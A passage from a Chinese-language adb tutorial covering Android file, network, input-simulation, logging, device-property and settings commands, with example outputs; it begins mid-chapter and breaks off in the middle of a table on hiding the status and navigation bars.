<h4 id="459-输出当前目录路径">4.5.9 输出当前目录路径</h4>
<pre><code>adb shell pwd
复制代码
</code></pre>
<p>第一步：执行<code>adb shell</code>命令；第二步：执行<code>pwd</code>命令输出当前目录路径。</p>
<h4 id="4510-复制文件和目录">4.5.10 复制文件和目录</h4>
<pre><code>adb shell cp [options] &lt;source&gt; &lt;dest&gt;
复制代码
</code></pre>
<p>第一步：执行<code>adb shell</code>命令；第二步：执行<code>cp [options] &lt;source&gt; &lt;dest&gt;</code>命令复制文件和目录。参数说明：</p>
<ul>
<li><code>source</code>:源文件路径</li>
<li><code>dest</code>: 目标文件路径</li>
</ul>
<h4 id="4511-移动或重命名文件">4.5.11 移动或重命名文件</h4>
<pre><code>adb shell mv [options] &lt;source&gt; &lt;dest&gt;
复制代码
</code></pre>
<p>第一步：执行<code>adb shell</code>命令；第二步：执行<code>mv [options] &lt;source&gt; &lt;dest&gt;</code>命令移动或重命名文件。参数说明：</p>
<ul>
<li><code>source</code>:源文件路径</li>
<li><code>dest</code>: 目标文件路径</li>
</ul>
<h3 id="46-网络管理">4.6 网络管理</h3>
<h4 id="461-查看网络统计信息">4.6.1 查看网络统计信息</h4>
<pre><code>adb shell netstat
复制代码
</code></pre>
<p>也可以将网络统计信息输出到指定文件：</p>
<pre><code>adb shell netstat&gt;&lt;file-path&gt;
复制代码
</code></pre>
<p>例如，可以通过 <code>adb shell netstat&gt;D:\netstat.log</code> 将日志输出到 <code>D:\netstat.log</code> 中。</p>
<h4 id="462-测试两个网络间的连接和延迟">4.6.2 测试两个网络间的连接和延迟</h4>
<p><code>ping</code> 命令的格式如下：</p>
<pre><code>adb shell ping [-aAbBdDfhLnOqrRUvV] [-c count] [-i interval] [-I interface]
[-m mark] [-M pmtudisc_option] [-l preload] [-p pattern] [-Q tos]
[-s packetsize] [-S sndbuf] [-t ttl] [-T timestamp_option]
[-w deadline] [-W timeout] [hop1 ...] destination
复制代码
</code></pre>
<p>例如，ping一个域名：</p>
<pre><code>adb shell ping www.google.com
复制代码
</code></pre>
<p>不结束的话会一直ping下去，可以按 <code>Ctrl + C</code> 停止ping操作。</p>
<p>也可以指定ping的次数：</p>
<pre><code>adb shell ping -c 4 www.google.com
复制代码
</code></pre>
<h4 id="463-通过配置文件配置和管理网络连接">4.6.3 通过配置文件配置和管理网络连接</h4>
<p><code>netcfg</code> 命令的格式如下：</p>
<pre><code>adb shell netcfg [&lt;interface&gt; {dhcp|up|down}]
复制代码
</code></pre>
<p>输出示例：</p>
<pre><code>rmnet_ims10 DOWN                                   0.0.0.0/0   0x00001002
rmnet_ims00 DOWN                                   0.0.0.0/0   0x00001002
rmnet_tun04 DOWN                                   0.0.0.0/0   0x00001002
rmnet_tun03 DOWN                                   0.0.0.0/0   0x00001002
rmnet_tun02 DOWN                                   0.0.0.0/0   0x00001002
rmnet_tun01 DOWN                                   0.0.0.0/0   0x00001002
rmnet_tun00 DOWN                                   0.0.0.0/0   0x00001002
rmnet_tun14 DOWN                                   0.0.0.0/0   0x00001002
rmnet_tun13 DOWN                                   0.0.0.0/0   0x00001002
rmnet_tun12 DOWN                                   0.0.0.0/0   0x00001002
rmnet_tun11 DOWN                                   0.0.0.0/0   0x00001002
rmnet_tun10 DOWN                                   0.0.0.0/0   0x00001002
rmnet1   DOWN                                   0.0.0.0/0   0x00001002
rmnet0   DOWN                                   0.0.0.0/0   0x00001002
rmnet4   DOWN                                   0.0.0.0/0   0x00001002
rmnet3   DOWN                                   0.0.0.0/0   0x00001002
rmnet2   DOWN                                   0.0.0.0/0   0x00001002
rmnet6   DOWN                                   0.0.0.0/0   0x00001002
rmnet5   DOWN                                   0.0.0.0/0   0x00001002
dummy0   UP                                     0.0.0.0/0   0x000000c3
rmnet_r_ims10 DOWN                                   0.0.0.0/0   0x00001002
rmnet_r_ims00 DOWN                                   0.0.0.0/0   0x00001002
rmnet_emc0 DOWN                                   0.0.0.0/0   0x00001002
lo       UP                                   127.0.0.1/8   0x00000049
sit0     DOWN                                   0.0.0.0/0   0x00000080
wlan0    UP                                 10.0.38.176/23  0x00001043
复制代码
</code></pre>
<h4 id="464-显示-操作路由-设备-策略路由和隧道">4.6.4 显示、操作路由、设备、策略路由和隧道</h4>
<p><code>ip</code> 命令的格式如下：</p>
<pre><code>adb shell ip [ options ] object
复制代码
</code></pre>
<ul>
<li>options := { -V[ersion] | -s[tatistics] | -d[etails] | -r[esolve] |-f[amily] { inet | inet6 | ipx | dnet | link } |-l[oops] { maximum-addr-flush-attempts } |-o[neline] | -t[imestamp] | -b[atch][filename] |-rc[vbuf][size]}</li>
<li>object := { link | addr | addrlabel | route | rule | neigh | ntable |tunnel | tuntap | maddr | mroute | mrule | monitor | xfrm |netns | l2tp }</li>
</ul>
<p><code>options</code> 是一些修改ip行为或者改变其输出的选项。所有的选项都是以-字符开头，分为长、短两种形式，支持的可选参数及含义如下：</p>
<table>
<thead>
<tr>
<th>选项</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>-V,-Version</td>
<td>打印ip的版本并退出</td>
</tr>
<tr>
<td>-s,-stats,-statistics</td>
<td>输出更为详尽的信息(如果这个选项出现两次或者多次，输出的信息将更为详尽)</td>
</tr>
<tr>
<td>-f,-family</td>
<td>强调使用的协议种类(包括：inet、inet6或者link)</td>
</tr>
<tr>
<td>-4</td>
<td>是-family inet的简写</td>
</tr>
<tr>
<td>-6</td>
<td>是-family inet6的简写</td>
</tr>
<tr>
<td>-0</td>
<td>是-family link的简写</td>
</tr>
<tr>
<td>-o,-oneline</td>
<td>对每行记录都使用单行输出，回行用字符代替</td>
</tr>
<tr>
<td>-r,-resolve</td>
<td>查询域名解析系统，用获得的主机名代替主机IP地址</td>
</tr>
</tbody>
</table>
<p><code>object</code> 是你要管理或者获取信息的对象。目前ip认识的对象包括：</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>显示列表</th>
</tr>
</thead>
<tbody>
<tr>
<td>link</td>
<td>网络设备</td>
</tr>
<tr>
<td>address</td>
<td>一个设备的协议(IP或者IPV6)地址</td>
</tr>
<tr>
<td>neighbour</td>
<td>ARP或者NDISC缓冲区条目</td>
</tr>
<tr>
<td>route</td>
<td>路由表条目</td>
</tr>
<tr>
<td>rule</td>
<td>路由策略数据库中的规则</td>
</tr>
<tr>
<td>maddress</td>
<td>多播地址</td>
</tr>
<tr>
<td>mroute</td>
<td>多播路由缓冲区条目</td>
</tr>
<tr>
<td>tuntap</td>
<td>管理 TUN/TAP 设备</td>
</tr>
<tr>
<td>netns</td>
<td>管理网络空间</td>
</tr>
</tbody>
</table>
<p>例如，查看 <code>WiFi IP</code> 地址：</p>
<pre><code>adb shell ip -f inet addr show wlan0
复制代码
</code></pre>
<h3 id="47-模拟按键输入">4.7 模拟按键/输入</h3>
<p>在 <code>adb shell</code> 里有个很实用的命令叫 <code>input</code>，通过它可以做一些有趣的事情。可以执行<code>adb shell input</code>命令查看完整 help 信息如下：</p>
<pre><code>Usage: input [&lt;source&gt;] &lt;command&gt; [&lt;arg&gt;...]

The sources are:
      dpad
      keyboard
      mouse
      touchpad
      gamepad
      touchnavigation
      joystick
      touchscreen
      stylus
      trackball

The commands and default sources are:
      text &lt;string&gt; (Default: touchscreen)
      keyevent [--longpress] &lt;key code number or name&gt; ... (Default: keyboard)
      tap &lt;x&gt; &lt;y&gt; (Default: touchscreen)
      swipe &lt;x1&gt; &lt;y1&gt; &lt;x2&gt; &lt;y2&gt; [duration(ms)] (Default: touchscreen)
      draganddrop &lt;x1&gt; &lt;y1&gt; &lt;x2&gt; &lt;y2&gt; [duration(ms)] (Default: touchscreen)
      press (Default: trackball)
      roll &lt;dx&gt; &lt;dy&gt; (Default: trackball)
复制代码
</code></pre>
<p>比如使用 <code>adb shell input keyevent &lt;keycode&gt;</code> 命令，不同的 keycode 能实现不同的功能，完整的 keycode 列表详见 <a href="https://link.juejin.im?target=https%3A%2F%2Fdeveloper.android.com%2Freference%2Fandroid%2Fview%2FKeyEvent.html">KeyEvent</a>，摘引部分我觉得有意思的如下：</p>
<table>
<thead>
<tr>
<th>keycode</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>3</td>
<td>HOME 键</td>
</tr>
<tr>
<td>4</td>
<td>返回键</td>
</tr>
<tr>
<td>5</td>
<td>打开拨号应用</td>
</tr>
<tr>
<td>6</td>
<td>挂断电话</td>
</tr>
<tr>
<td>24</td>
<td>增加音量</td>
</tr>
<tr>
<td>25</td>
<td>降低音量</td>
</tr>
<tr>
<td>26</td>
<td>电源键</td>
</tr>
<tr>
<td>27</td>
<td>拍照（需要在相机应用里）</td>
</tr>
<tr>
<td>64</td>
<td>打开浏览器</td>
</tr>
<tr>
<td>82</td>
<td>菜单键</td>
</tr>
<tr>
<td>85</td>
<td>播放/暂停</td>
</tr>
<tr>
<td>86</td>
<td>停止播放</td>
</tr>
<tr>
<td>87</td>
<td>播放下一首</td>
</tr>
<tr>
<td>88</td>
<td>播放上一首</td>
</tr>
<tr>
<td>122</td>
<td>移动光标到行首或列表顶部</td>
</tr>
<tr>
<td>123</td>
<td>移动光标到行末或列表底部</td>
</tr>
<tr>
<td>126</td>
<td>恢复播放</td>
</tr>
<tr>
<td>127</td>
<td>暂停播放</td>
</tr>
<tr>
<td>164</td>
<td>静音</td>
</tr>
<tr>
<td>176</td>
<td>打开系统设置</td>
</tr>
<tr>
<td>187</td>
<td>切换应用</td>
</tr>
<tr>
<td>207</td>
<td>打开联系人</td>
</tr>
<tr>
<td>208</td>
<td>打开日历</td>
</tr>
<tr>
<td>209</td>
<td>打开音乐</td>
</tr>
<tr>
<td>210</td>
<td>打开计算器</td>
</tr>
<tr>
<td>220</td>
<td>降低屏幕亮度</td>
</tr>
<tr>
<td>221</td>
<td>提高屏幕亮度</td>
</tr>
<tr>
<td>223</td>
<td>系统休眠</td>
</tr>
<tr>
<td>224</td>
<td>点亮屏幕</td>
</tr>
<tr>
<td>231</td>
<td>打开语音助手</td>
</tr>
<tr>
<td>276</td>
<td>如果没有 wakelock 则让系统休眠</td>
</tr>
</tbody>
</table>
<p>下面是 <code>input</code> 命令的一些用法举例。</p>
<h4 id="471-电源键">4.7.1 电源键</h4>
<pre><code>adb shell input keyevent 26
复制代码
</code></pre>
<p>执行效果相当于按电源键。</p>
<h4 id="472-菜单键">4.7.2 菜单键</h4>
<pre><code>adb shell input keyevent 82
复制代码
</code></pre>
<h4 id="473-home-键">4.7.3 HOME 键</h4>
<pre><code>adb shell input keyevent 3
复制代码
</code></pre>
<h4 id="474-返回键">4.7.4 返回键</h4>
<pre><code>adb shell input keyevent 4
复制代码
</code></pre>
<h4 id="475-音量控制">4.7.5 音量控制</h4>
<ul>
<li>增加音量：</li>
</ul>
<pre><code>adb shell input keyevent 24
复制代码
</code></pre>
<ul>
<li>降低音量：</li>
</ul>
<pre><code>adb shell input keyevent 25
复制代码
</code></pre>
<ul>
<li>静音：</li>
</ul>
<pre><code>adb shell input keyevent 164
复制代码
</code></pre>
<h4 id="476-媒体控制">4.7.6 媒体控制</h4>
<ul>
<li>播放/暂停：</li>
</ul>
<pre><code>adb shell input keyevent 85
复制代码
</code></pre>
<ul>
<li>停止播放：</li>
</ul>
<pre><code>adb shell input keyevent 86
复制代码
</code></pre>
<ul>
<li>播放下一首：</li>
</ul>
<pre><code>adb shell input keyevent 87
复制代码
</code></pre>
<ul>
<li>播放上一首：</li>
</ul>
<pre><code>adb shell input keyevent 88
复制代码
</code></pre>
<ul>
<li>恢复播放：</li>
</ul>
<pre><code>adb shell input keyevent 126
复制代码
</code></pre>
<ul>
<li>暂停播放：</li>
</ul>
<pre><code>adb shell input keyevent 127
复制代码
</code></pre>
<h4 id="477-点亮熄灭屏幕">4.7.7 点亮/熄灭屏幕</h4>
<ul>
<li>点亮屏幕：</li>
</ul>
<pre><code>adb shell input keyevent 224
复制代码
</code></pre>
<ul>
<li>熄灭屏幕：</li>
</ul>
<pre><code>adb shell input keyevent 223
复制代码
</code></pre>
<h4 id="478-滑动解锁">4.7.8 滑动解锁</h4>
<p>如果锁屏没有密码，是通过滑动手势解锁，那么可以通过 <code>input swipe</code> 来解锁。命令（参数以机型 Nexus 5，向上滑动手势解锁举例）：</p>
<pre><code>adb shell input swipe 300 1000 300 500
复制代码
</code></pre>
<p>参数 <code>300 1000 300 500</code> 分别表示<code>起始点x坐标 起始点y坐标 结束点x坐标 结束点y坐标</code>。</p>
<h4 id="479-输入文本">4.7.9 输入文本</h4>
<p>在焦点处于某文本框时，可以通过 <code>input</code> 命令来输入文本。</p>
<pre><code>adb shell input text hello
复制代码
</code></pre>
<h3 id="48-日志打印">4.8 日志打印</h3>
<p>Android 系统的日志分为两部分，底层的 Linux 内核日志输出到 /proc/kmsg，Android 的日志输出到 /dev/log。</p>
<h4 id="481-android-日志">4.8.1 Android 日志</h4>
<p>查看 Android 设备系统属性的基本命令格式是：</p>
<pre><code>adb logcat [option] [filter-specs]
复制代码
</code></pre>
<p>如果需要停止 <code>logcat</code> 日志打印，可以按 <code>Ctrl + C</code> 停止日志监控。</p>
<h5 id="4811-按级别过滤日志">4.8.1.1 按级别过滤日志</h5>
<p>按级别过滤日志的基本命令格式是：</p>
<pre><code>adb logcat [filter-specs]
复制代码
</code></pre>
<p>Android 的日志分为如下几个优先级（priority）：</p>
<table>
<thead>
<tr>
<th>级别</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>*:V</td>
<td>过滤只显示 Verbose 及以上级别(优先级最低)</td>
</tr>
<tr>
<td>*:D</td>
<td>过滤只显示 Debug 及以上级别</td>
</tr>
<tr>
<td>*:I</td>
<td>过滤只显示 Info 及以上级别</td>
</tr>
<tr>
<td>*:W</td>
<td>过滤只显示 Warning 及以上级别</td>
</tr>
<tr>
<td>*:E</td>
<td>过滤只显示 Error 及以上级别</td>
</tr>
<tr>
<td>*:F</td>
<td>过滤只显示 Fatal 及以上级别</td>
</tr>
<tr>
<td>*:S</td>
<td>过滤只显示 Silent 及以上级别(优先级最高，什么也不输出)</td>
</tr>
</tbody>
</table>
<p>按某级别过滤日志则会将该级别及以上的日志输出。</p>
<p>比如，命令：</p>
<pre><code>adb logcat *:W
复制代码
</code></pre>
<p>会将 Warning、Error、Fatal 和 Silent 日志输出。</p>
<p>（<strong>注：</strong> 在 macOS 下需要给 <code>*:W</code> 这样以 <code>*</code> 作为 tag 的参数加双引号，如 <code>adb logcat &quot;*:W&quot;</code>，不然会报错 <code>no matches found: *:W</code>。）</p>
<h5 id="4812-按-tag-和级别过滤日志">4.8.1.2 按 tag 和级别过滤日志</h5>
<p>按 tag 和级别过滤日志的基本命令格式是：</p>
<pre><code>adb logcat [tag:level] [tag:level] ...
复制代码
</code></pre>
<p>比如，命令：</p>
<pre><code>adb logcat ActivityManager:I MyApp:D *:S
复制代码
</code></pre>
<p>表示输出 tag <code>ActivityManager</code> 的 Info 以上级别日志，输出 tag <code>MyApp</code> 的 Debug 以上级别日志，及其它 tag 的 Silent 级别日志（即屏蔽其它 tag 日志）。</p>
<h5 id="4813-将日志格式化输出">4.8.1.3 将日志格式化输出</h5>
<p>可以用 <code>adb logcat -v &lt;format&gt;</code> 选项指定日志输出格式。</p>
<p>日志支持按以下几种 <code>&lt;format&gt;</code>：</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>显示格式</th>
</tr>
</thead>
<tbody>
<tr>
<td>brief</td>
<td><code>&lt;priority&gt;/&lt;tag&gt;(&lt;pid&gt;): &lt;message&gt;</code></td>
</tr>
<tr>
<td>process</td>
<td><code>&lt;priority&gt;(&lt;pid&gt;) &lt;message&gt;</code></td>
</tr>
<tr>
<td>tag</td>
<td><code>&lt;priority&gt;/&lt;tag&gt;: &lt;message&gt;</code></td>
</tr>
<tr>
<td>raw</td>
<td><code>&lt;message&gt;</code></td>
</tr>
<tr>
<td>time</td>
<td><code>&lt;datetime&gt; &lt;priority&gt;/&lt;tag&gt;(&lt;pid&gt;): &lt;message&gt;</code></td>
</tr>
<tr>
<td>threadtime</td>
<td><code>&lt;datetime&gt; &lt;pid&gt; &lt;tid&gt; &lt;priority&gt; &lt;tag&gt;: &lt;message&gt;</code></td>
</tr>
<tr>
<td>long</td>
<td><code>[ &lt;datetime&gt; &lt;pid&gt;:&lt;tid&gt; &lt;priority&gt;/&lt;tag&gt; ] &lt;message&gt;</code></td>
</tr>
</tbody>
</table>
<p>日志格式默认为 <code>brief</code>，指定格式可与上面的过滤同时使用。比如：</p>
<pre><code>adb logcat -v long ActivityManager:I *:S
复制代码
</code></pre>
<h5 id="4813-清空已存在的日志">4.8.1.3 清空已存在的日志</h5>
<pre><code>adb logcat -c
复制代码
</code></pre>
<h5 id="4814-将日志显示在控制台">4.8.1.4 将日志显示在控制台</h5>
<pre><code>adb logcat -d
复制代码
</code></pre>
<h5 id="4815-将日志输出到文件">4.8.1.5 将日志输出到文件</h5>
<pre><code>adb logcat -f &lt;file-path&gt;
复制代码
</code></pre>
<h5 id="4816-加载一个可使用的日志缓冲区供查看">4.8.1.6 加载一个可使用的日志缓冲区供查看</h5>
<pre><code>adb logcat -b &lt;Buffer&gt;
复制代码
</code></pre>
<p><code>Android log</code> 输出量巨大，特别是通信系统的log，因此，Android把log输出到不同的缓冲区中，目前定义了四个log缓冲区：</p>
<table>
<thead>
<tr>
<th>缓冲区</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>Radio</td>
<td>输出通信系统的 log</td>
</tr>
<tr>
<td>System</td>
<td>输出系统组件的 log</td>
</tr>
<tr>
<td>Event</td>
<td>输出 event 模块的 log</td>
</tr>
<tr>
<td>Main</td>
<td>所有 java 层的 log 以及不属于上面3层的 log</td>
</tr>
</tbody>
</table>
<p>缓冲区主要给系统组件使用，一般的应用不需要关心，应用的log都输出到main缓冲区中。默认log输出（不指定缓冲区的情况下）是输出System和Main缓冲区的log。</p>
<h5 id="4817-打印指定日志缓冲区的大小">4.8.1.7 打印指定日志缓冲区的大小</h5>
<pre><code>adb logcat -g
复制代码
</code></pre>
<h4 id="482-内核日志">4.8.2 内核日志</h4>
<pre><code>adb shell dmesg
复制代码
</code></pre>
<p>输出示例：</p>
<pre><code>&lt;6&gt;[14201.684016] PM: noirq resume of devices complete after 0.982 msecs
&lt;6&gt;[14201.685525] PM: early resume of devices complete after 0.838 msecs
&lt;6&gt;[14201.753642] PM: resume of devices complete after 68.106 msecs
&lt;4&gt;[14201.755954] Restarting tasks ... done.
&lt;6&gt;[14201.771229] PM: suspend exit 2016-08-28 13:31:32.679217193 UTC
&lt;6&gt;[14201.872373] PM: suspend entry 2016-08-28 13:31:32.780363596 UTC
&lt;6&gt;[14201.872498] PM: Syncing filesystems ... done.
复制代码
</code></pre>
<p>中括号里的 <code>[14201.684016]</code> 代表内核开始启动后的时间，单位为秒。</p>
<p>通过内核日志我们可以做一些事情，比如衡量内核启动时间，在系统启动完毕后的内核日志里找到 <code>Freeing init memory</code> 那一行前面的时间就是。</p>
<h3 id="49-查看-android-设备系统属性">4.9 查看 Android 设备系统属性</h3>
<p>查看 Android 设备系统属性的基本命令格式是：</p>
<pre><code>adb shell getprop [options]
复制代码
</code></pre>
<p>除了可以查看 Android 设备系统属性之外，还可以设置系统属性，设置系统属性的基本命令格式是：</p>
<pre><code>adb shell setprop &lt;key&gt; &lt;value&gt;
复制代码
</code></pre>
<h4 id="491-查看设备型号">4.9.1 查看设备型号</h4>
<pre><code>adb shell getprop ro.product.model
复制代码
</code></pre>
<p>输出示例：</p>
<pre><code>Nexus 5
复制代码
</code></pre>
<h4 id="492-查看设备电池状况">4.9.2 查看设备电池状况</h4>
<pre><code>adb shell dumpsys battery
复制代码
</code></pre>
<p>输出示例：</p>
<pre><code>Current Battery Service state:
  AC powered: false
  USB powered: true
  Wireless powered: false
  status: 2
  health: 2
  present: true
  level: 44
  scale: 100
  voltage: 3872
  temperature: 280
  technology: Li-poly
复制代码
</code></pre>
<p>其中 <code>scale</code> 代表最大电量，<code>level</code> 代表当前电量。上面的输出表示还剩下 44% 的电量。</p>
<h4 id="493-查看设备屏幕分辨率">4.9.3 查看设备屏幕分辨率</h4>
<pre><code>adb shell wm size
复制代码
</code></pre>
<p>输出示例：</p>
<pre><code>Physical size: 1080x1920
复制代码
</code></pre>
<p>该设备屏幕分辨率为 1080px * 1920px。</p>
<p>如果使用命令修改过，那输出可能是：</p>
<pre><code>Physical size: 1080x1920
Override size: 480x1024
复制代码
</code></pre>
<p>表明设备的屏幕分辨率原本是 1080px * 1920px，当前被修改为 480px * 1024px。</p>
<h4 id="494-查看设备屏幕密度">4.9.4 查看设备屏幕密度</h4>
<pre><code>adb shell wm density
复制代码
</code></pre>
<p>输出示例：</p>
<pre><code>Physical density: 420
复制代码
</code></pre>
<p>该设备屏幕密度为 420dpi。</p>
<p>如果使用命令修改过，那输出可能是：</p>
<pre><code>Physical density: 480
Override density: 160
复制代码
</code></pre>
<p>表明设备的屏幕密度原来是 480dpi，当前被修改为 160dpi。</p>
<h4 id="495-查看设备显示屏参数">4.9.5 查看设备显示屏参数</h4>
<pre><code>adb shell dumpsys window displays
复制代码
</code></pre>
<p>输出示例：</p>
<pre><code>WINDOW MANAGER DISPLAY CONTENTS (dumpsys window displays)
  Display: mDisplayId=0
    init=1080x1920 420dpi cur=1080x1920 app=1080x1794 rng=1080x1017-1810x1731
    deferred=false layoutNeeded=false
复制代码
</code></pre>
<p>其中 <code>mDisplayId</code> 为 显示屏编号，<code>init</code> 是初始分辨率和屏幕密度，<code>app</code> 的高度比 <code>init</code> 里的要小，表示屏幕底部有虚拟按键，高度为 1920 - 1794 = 126px 合 42dp。</p>
<h4 id="496-查看设备-android_id">4.9.6 查看设备 android_id</h4>
<pre><code>adb shell settings get secure android_id
复制代码
</code></pre>
<p>输出示例：</p>
<pre><code>51b6be48bac8c569
复制代码
</code></pre>
<h4 id="497-查看设备imei">4.9.7 查看设备IMEI</h4>
<p>在 Android 4.4 及以下版本可通过如下命令获取 IMEI：</p>
<pre><code>adb shell dumpsys iphonesubinfo
复制代码
</code></pre>
<p>输出示例：</p>
<pre><code>Phone Subscriber Info:
  Phone Type = GSM
  Device ID = 860955027785041
复制代码
</code></pre>
<p>其中的 <code>Device ID</code> 就是 IMEI。</p>
<p>而在 Android 5.0 及以上版本里这个命令输出为空，得通过其它方式获取了（需要 root 权限）：</p>
<pre><code>adb shell
su
service call iphonesubinfo 1
复制代码
</code></pre>
<p>把里面的有效内容提取出来就是 IMEI 了，比如这里的是 <code>860955027785041</code>。</p>
<p>参考：<a href="https://link.juejin.im?target=http%3A%2F%2Fstackoverflow.com%2Fquestions%2F27002663%2Fadb-shell-dumpsys-iphonesubinfo-not-working-since-android-5-0-lollipop">adb shell dumpsys iphonesubinfo not working since Android 5.0 Lollipop</a></p>
<h4 id="498-查看设备-android-系统版本">4.9.8 查看设备 Android 系统版本</h4>
<pre><code>adb shell getprop ro.build.version.release
复制代码
</code></pre>
<p>输出示例：</p>
<pre><code>5.0.2
复制代码
</code></pre>
<h4 id="499-查看设备-ip-地址">4.9.9 查看设备 IP 地址</h4>
<pre><code>adb shell ifconfig | grep Mask
复制代码

</code></pre>
<p>在有的设备上这个命令没有输出，如果设备连着 WiFi，可以使用如下命令来查看局域网 IP：</p>
<pre><code>adb shell ifconfig wlan0
复制代码
</code></pre>
<p>如果以上命令仍然不能得到期望的信息，那可以试试以下命令（部分系统版本里可用）：</p>
<pre><code>adb shell netcfg
复制代码
</code></pre>
<h4 id="4910-查看设备-mac-地址">4.9.10 查看设备 Mac 地址</h4>
<pre><code>adb shell cat /sys/class/net/wlan0/address
复制代码
</code></pre>
<p>输出示例：</p>
<pre><code>f8:a9:d0:17:42:4d
复制代码
</code></pre>
<p>这查看的是局域网 Mac 地址，移动网络或其它连接的信息可以通过前面的小节「IP 地址」里提到的 <code>adb shell netcfg</code> 命令来查看。</p>
<h4 id="4911-查看设备-cpu-信息">4.9.11 查看设备 CPU 信息</h4>
<pre><code>adb shell cat /proc/cpuinfo
复制代码
</code></pre>
<h4 id="4912-查看设备内存信息">4.9.12 查看设备内存信息</h4>
<pre><code>adb shell cat /proc/meminfo
复制代码
</code></pre>
<h4 id="4913-查看设备更多硬件与系统属性">4.9.13 查看设备更多硬件与系统属性</h4>
<p>设备的更多硬件与系统属性可以通过如下命令查看：</p>
<pre><code>adb shell cat /system/build.prop
复制代码
</code></pre>
<p>这会输出很多信息，包括前面几个小节提到的「型号」和「Android 系统版本」等。</p>
<p>输出里还包括一些其它有用的信息，它们也可通过 <code>adb shell getprop &lt;属性名&gt;</code> 命令单独查看，列举一部分属性如下：</p>
<table>
<thead>
<tr>
<th>属性名</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>ro.build.version.sdk</td>
<td>SDK 版本</td>
</tr>
<tr>
<td>ro.build.version.release</td>
<td>Android 系统版本</td>
</tr>
<tr>
<td>ro.build.version.security_patch</td>
<td>Android 安全补丁程序级别</td>
</tr>
<tr>
<td>ro.product.model</td>
<td>型号</td>
</tr>
<tr>
<td>ro.product.brand</td>
<td>品牌</td>
</tr>
<tr>
<td><a href="https://link.juejin.im?target=http%3A%2F%2Fro.product.name">ro.product.name</a></td>
<td>设备名</td>
</tr>
<tr>
<td>ro.product.board</td>
<td>处理器型号</td>
</tr>
<tr>
<td>ro.product.cpu.abilist</td>
<td>CPU 支持的 abi 列表[<em>节注一</em>]</td>
</tr>
<tr>
<td>persist.sys.isUsbOtgEnabled</td>
<td>是否支持 OTG</td>
</tr>
<tr>
<td>dalvik.vm.heapsize</td>
<td>每个应用程序的内存上限</td>
</tr>
<tr>
<td>ro.sf.lcd_density</td>
<td>屏幕密度</td>
</tr>
</tbody>
</table>
<p><em>节注一：</em></p>
<p>一些小厂定制的 ROM 可能修改过 CPU 支持的 abi 列表的属性名，如果用 <code>ro.product.cpu.abilist</code> 属性名查找不到，可以这样试试：</p>
<pre><code>adb shell cat /system/build.prop | grep ro.product.cpu.abi
复制代码
</code></pre>
<p>示例输出：</p>
<pre><code>ro.product.cpu.abi=armeabi-v7a
ro.product.cpu.abi2=armeabi
复制代码
</code></pre>
<h3 id="410-修改设置">4.10 修改设置</h3>
<p><strong>注：</strong> 修改设置之后，运行恢复命令有可能显示仍然不太正常，可以运行 <code>adb reboot</code> 重启设备，或手动重启。</p>
<p>修改设置的原理主要是通过 settings 命令修改 /data/data/com.android.providers.settings/databases/settings.db 里存放的设置值。</p>
<h4 id="4101-修改分辨率">4.10.1 修改分辨率</h4>
<pre><code>adb shell wm size 480x1024
复制代码
</code></pre>
<p>表示将分辨率修改为 480px * 1024px。</p>
<p>恢复原分辨率命令：</p>
<pre><code>adb shell wm size reset
复制代码
</code></pre>
<h4 id="4102-修改屏幕密度">4.10.2 修改屏幕密度</h4>
<pre><code>adb shell wm density 160
复制代码
</code></pre>
<p>表示将屏幕密度修改为 160dpi。</p>
<p>恢复原屏幕密度命令：</p>
<pre><code>adb shell wm density reset
复制代码
</code></pre>
<h4 id="4103-修改显示区域">4.10.3 修改显示区域</h4>
<pre><code>adb shell wm overscan 0,0,0,200
复制代码
</code></pre>
<p>四个数字分别表示距离左、上、右、下边缘的留白像素，以上命令表示将屏幕底部 200px 留白。</p>
<p>恢复原显示区域命令：</p>
<pre><code>adb shell wm overscan reset
复制代码
</code></pre>
<h4 id="4104-修改关闭-usb-调试模式">4.10.4 修改关闭 USB 调试模式</h4>
<pre><code>adb shell settings put global adb_enabled 0
复制代码
</code></pre>
<p>用命令恢复不了了，毕竟关闭了 USB 调试 adb 就连接不上 Android 设备了。去设备上手动恢复吧：「设置」-「开发者选项」-「Android 调试」。</p>
<h4 id="4105-修改允许禁止访问非-sdk-api">4.10.5 修改允许/禁止访问非 SDK API</h4>
<p>允许访问非 SDK API：</p>
<pre><code>adb shell settings put global hidden_api_policy_pre_p_apps 1
adb shell settings put global hidden_api_policy_p_apps 1
复制代码
</code></pre>
<p>禁止访问非 SDK API：</p>
<pre><code>adb shell settings delete global hidden_api_policy_pre_p_apps
adb shell settings delete global hidden_api_policy_p_apps
复制代码
</code></pre>
<p>不需要设备获得 Root 权限。</p>
<p>命令最后的数字的含义：</p>
<table>
<thead>
<tr>
<th>值</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>禁止检测非 SDK 接口的调用。该情况下，日志记录功能被禁用，并且令 strict mode API，即 detectNonSdkApiUsage() 无效。不推荐。</td>
</tr>
<tr>
<td>1</td>
<td>仅警告——允许访问所有非 SDK 接口，但保留日志中的警告信息，可继续使用 strick mode API。</td>
</tr>
<tr>
<td>2</td>
<td>禁止调用深灰名单和黑名单中的接口。</td>
</tr>
<tr>
<td>3</td>
<td>禁止调用黑名单中的接口，但允许调用深灰名单中的接口。</td>
</tr>
</tbody>
</table>
<h4 id="4106-修改状态栏和导航栏的显示隐藏">4.10.6 修改状态栏和导航栏的显示隐藏</h4>
<pre><code>adb shell settings put global policy_control &lt;key-values&gt;
复制代码
</code></pre>
<p><code>&lt;key-values&gt;</code> 可由如下几种键及其对应的值组成，格式为 <code>&lt;key1&gt;=&lt;value1&gt;:&lt;key2&gt;=&lt;value2&gt;</code>。</p>
<table>
<thead>
<tr>
<th>key</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>immersive.full</td>
<td>同时隐藏</td>
</tr>
<tr>
<td>immersive.status</td>
<td>隐藏状态栏</td>
</tr>
<tr>
<td>immersive.navigation</td>
<td>隐藏导航栏</td>
</tr>
<tr>
<td>immersive.preconfirms</td>
<td>?</td>
</tr>
</tbody>
</table>
<p>这些键对应的值可则如下值用逗号组合：</p>
<table>
<thead>
<tr>
<th>value</th>
<th>含义</th>
</tr>
</thead>
<tbody>
